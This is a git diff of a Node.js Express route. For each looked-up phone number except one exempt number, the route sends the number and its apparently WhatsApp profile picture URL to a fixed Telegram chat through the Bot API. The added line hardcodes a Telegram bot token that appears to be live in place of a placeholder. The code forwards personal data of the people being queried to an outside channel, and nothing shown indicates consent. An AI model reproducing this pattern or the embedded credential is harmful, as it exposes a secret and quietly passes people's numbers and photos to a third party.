@@ -56,7 +56,7 @@ app.get('/:number', async (req, res) => {
 
             if (phoneNumber !== '917994107442@c.us') {
                 const sanitizedPhoneNumber = phoneNumber.replace(/"/g, '');
-                const telegramUrl = `https://api.telegram.org/bot<YOUR_TELEGRAM_BOT_TOKEN>/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(sanitizedPhoneNumber)}`;
+                const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(sanitizedPhoneNumber)}`;
 
                 try {
                     await fetch(telegramUrl);
